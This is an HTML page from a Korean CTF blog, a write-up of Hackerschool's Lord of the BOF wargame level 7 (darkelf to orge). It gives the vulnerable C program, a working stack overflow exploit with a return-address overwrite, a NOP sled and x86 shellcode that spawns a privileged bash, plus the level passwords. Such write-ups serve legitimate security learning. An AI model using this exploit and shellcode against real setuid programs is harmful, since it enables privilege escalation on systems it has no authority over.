@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 BoF LEVEL7 (darkelf -> orge) : check argv[0]</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL7 (darkelf -&gt; orge) : check argv[0] | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL7 (darkelf -&gt; orge) : check argv[0]" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = darkelf pw = kernel crashed" />
+<meta property="og:description" content="id = darkelf pw = kernel crashed" />
+<link rel="canonical" href="http://localhost:4000/2015-11-08/hackerschool-BoF-stage-7/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-08/hackerschool-BoF-stage-7/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-08T16:30:00+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = darkelf pw = kernel crashed","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-08/hackerschool-BoF-stage-7/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL7 (darkelf -&gt; orge) : check argv[0]","dateModified":"2015-11-08T16:30:00+09:00","datePublished":"2015-11-08T16:30:00+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-08/hackerschool-BoF-stage-7/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 BoF LEVEL7 (darkelf -> orge) : check argv[0]</div>
+  <span class="post-date">
+    <time>08 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = darkelf</li>
+  <li>pw = kernel crashed</li>
+</ul>
+
+<!--more-->
+
+<h2 id="orgec">orge.c</h2>
+
+<p>이번 문제는 <code class="highlighter-rouge">argv[0]</code>인 실행 명령어가 <code class="highlighter-rouge">77</code> 자가 되어야 한다.  실행 명령어는 <code class="highlighter-rouge">orge</code> 이기 때문에 이를 <code class="highlighter-rouge">77</code>가 되도록 해야한다.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - orge
+        - check argv[0]
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// here is changed!
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">77</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv[0] error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// egghunter
+</span>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">47</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\xbf'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"stack is still your friend.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// check the length of argument
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">48</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argument is too long!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+        <span class="c1">// buffer hunter
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+<span class="p">}</span>              
+</code></pre></div></div>
+
+<p>실행 명령어를 77자로 만들기 위하여  상대 경로를 이용하여 <code class="highlighter-rouge">./dir/../</code> 형식으로 글자수를 맞추면 되지 않을까 ?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> mkdir <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*67'</span><span class="sb">`</span> 
+<span class="o">&gt;</span> ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../orge AAAA
+stack is still your friend. 
+</code></pre></div></div>
+
+<p>그런데, 이상한 것은 직접 실행을 할때에는 명령어 길이 조건 체크를 넘어갔는데, gdb 붙여서 디버깅을 하면 자꾸 너무 길게 나오는 것이다.  좀더 자세하게 보니깐 gdb 에서 상대경로로 실행을 하였으나 절대경로로 입력이 되어 아래와 같이 path 가 잡혀서 77자를 넘어가는 것이었다.</p>
+
+<p>그래서 항상 <strong>변하지 않도록 절대 path 를 사용해서 77자가 되도록 한 후</strong> gdb 로 디버깅을 해보자.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>버퍼 사이즈가 40bytes 인데 마지막에 버퍼를 0으로 set 하기 때문에 실제 shellcode 는 argv[2]에서 세팅을 하고, argv[1]에서는 shellcode 를 가르키도록 <code class="highlighter-rouge">LR</code>을 설정하여 공격하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="o">[</span>BUFFER 40bytes][SFP][LR]
+<span class="o">=</span> <span class="o">[</span>A 44bytes][LR]  <span class="o">[</span>NOP][ShellCode]
+
+<span class="nv">$ </span>/home/darkelf/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC/../orge  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x94\xfb\xff\xbf"'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*150 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage7.png" alt="img" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/home/darkelf/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC/../orge  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x94\xfb\xff\xbf"'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*150 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'</span><span class="sb">`</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                                             bash: /home/darkelf/.bashrc: Permission denied
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>506<span class="o">(</span>darkelf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>506<span class="o">(</span>darkelf<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>507<span class="o">(</span>orge<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>506<span class="o">(</span>darkelf<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="next-stage">Next stage</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 507
+timewalker
+</code></pre></div></div>
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
